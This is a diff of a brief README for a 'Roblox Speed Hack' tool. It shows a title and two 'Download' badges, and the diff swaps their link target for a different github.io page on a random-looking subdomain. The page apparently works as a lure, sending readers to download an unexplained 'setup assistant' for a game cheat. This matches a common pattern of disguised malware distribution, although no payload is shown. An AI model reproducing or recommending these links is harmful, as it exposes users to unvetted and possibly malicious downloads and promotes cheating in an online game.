@@ -1,7 +1,7 @@
 # 🏃 Roblox Speed Hack — Movement Control & Modifier Assistant
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-lightgrey?style=for-the-badge)](https://speedhack-for-roblox.github.io/.github/)  
-[![Download Now](https://img.shields.io/badge/Download_Now-blue?style=for-the-badge&logo=roblox)](https://speedhack-for-roblox.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-lightgrey?style=for-the-badge)](https://my-sapqwr.github.io/.github/)  
+[![Download Now](https://img.shields.io/badge/Download_Now-blue?style=for-the-badge&logo=roblox)](https://my-sapqwr.github.io/.github/)
 
 ---
   
